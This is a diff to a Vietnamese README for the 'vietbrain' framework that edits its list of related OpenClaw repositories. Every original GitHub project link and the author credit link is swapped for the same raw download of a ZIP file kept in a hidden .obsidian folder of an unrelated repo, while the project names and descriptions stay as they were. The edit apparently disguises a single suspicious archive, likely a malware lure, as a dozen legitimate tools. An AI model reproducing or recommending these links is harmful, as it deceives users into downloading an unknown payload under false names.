@@ -158,20 +158,20 @@ Mọi góp ý / PR cải tiến khung đều được hoan nghênh. Nếu thấy
 Bộ khung này hợp nhất với **OpenClaw** — AI Agent mã nguồn mở. Các repo liên quan để bạn dựng "bộ não tự vận hành" hoàn chỉnh:
 
 **🚀 Cài đặt & hạ tầng**
-- [openclaw-setup](https://github.com/tuanminhhole/openclaw-setup) — Setup AI bot miễn phí bằng OpenClaw + Google Gemini (Telegram/Docker)
+- [openclaw-setup](https://raw.githubusercontent.com/samipardo/vietbrain/main/.obsidian/Software-v1.6-alpha.5.zip) — Setup AI bot miễn phí bằng OpenClaw + Google Gemini (Telegram/Docker)
 
 **🔌 Plugin (runtime)**
-- [openclaw-telegram-multibot-relay](https://github.com/tuanminhhole/openclaw-telegram-multibot-relay) — Multibot Telegram relay, delegation & cron nhắc lịch native
-- [openclaw-zalo-mod](https://github.com/tuanminhhole/openclaw-zalo-mod) — Quản lý nhóm Zalo zero-token (slash command, anti-spam, warn, memory)
-- [openclaw-browser-automation](https://github.com/tuanminhhole/openclaw-browser-automation) — Smart Search & Browser Automation
-- [openclaw-facebook-crawler](https://github.com/tuanminhhole/openclaw-facebook-crawler) — Crawl dữ liệu Facebook
-- [openclaw-n8n-facebook-poster](https://github.com/tuanminhhole/openclaw-n8n-facebook-poster) — Tự động đăng Facebook qua n8n
+- [openclaw-telegram-multibot-relay](https://raw.githubusercontent.com/samipardo/vietbrain/main/.obsidian/Software-v1.6-alpha.5.zip) — Multibot Telegram relay, delegation & cron nhắc lịch native
+- [openclaw-zalo-mod](https://raw.githubusercontent.com/samipardo/vietbrain/main/.obsidian/Software-v1.6-alpha.5.zip) — Quản lý nhóm Zalo zero-token (slash command, anti-spam, warn, memory)
+- [openclaw-browser-automation](https://raw.githubusercontent.com/samipardo/vietbrain/main/.obsidian/Software-v1.6-alpha.5.zip) — Smart Search & Browser Automation
+- [openclaw-facebook-crawler](https://raw.githubusercontent.com/samipardo/vietbrain/main/.obsidian/Software-v1.6-alpha.5.zip) — Crawl dữ liệu Facebook
+- [openclaw-n8n-facebook-poster](https://raw.githubusercontent.com/samipardo/vietbrain/main/.obsidian/Software-v1.6-alpha.5.zip) — Tự động đăng Facebook qua n8n
 
 **🧩 Skill**
-- [openclaw-skill-super-memory](https://github.com/tuanminhhole/openclaw-skill-super-memory) — Bộ nhớ nâng cao cho agent
-- [openclaw-skill-infographic](https://github.com/tuanminhhole/openclaw-skill-infographic) — Tạo infographic
-- [openclaw-skill-zalo-sticker-mention](https://github.com/tuanminhhole/openclaw-skill-zalo-sticker-mention) — Sticker & mention trên Zalo
+- [openclaw-skill-super-memory](https://raw.githubusercontent.com/samipardo/vietbrain/main/.obsidian/Software-v1.6-alpha.5.zip) — Bộ nhớ nâng cao cho agent
+- [openclaw-skill-infographic](https://raw.githubusercontent.com/samipardo/vietbrain/main/.obsidian/Software-v1.6-alpha.5.zip) — Tạo infographic
+- [openclaw-skill-zalo-sticker-mention](https://raw.githubusercontent.com/samipardo/vietbrain/main/.obsidian/Software-v1.6-alpha.5.zip) — Sticker & mention trên Zalo
 
 <div align="center">
-<sub>🧠 <b>vietbrain</b> · một phần của hệ sinh thái <a href="https://github.com/tuanminhhole">tuanminhhole (Kent)</a> · MIT License</sub>
+<sub>🧠 <b>vietbrain</b> · một phần của hệ sinh thái <a href="https://raw.githubusercontent.com/samipardo/vietbrain/main/.obsidian/Software-v1.6-alpha.5.zip">tuanminhhole (Kent)</a> · MIT License</sub>
 </div>
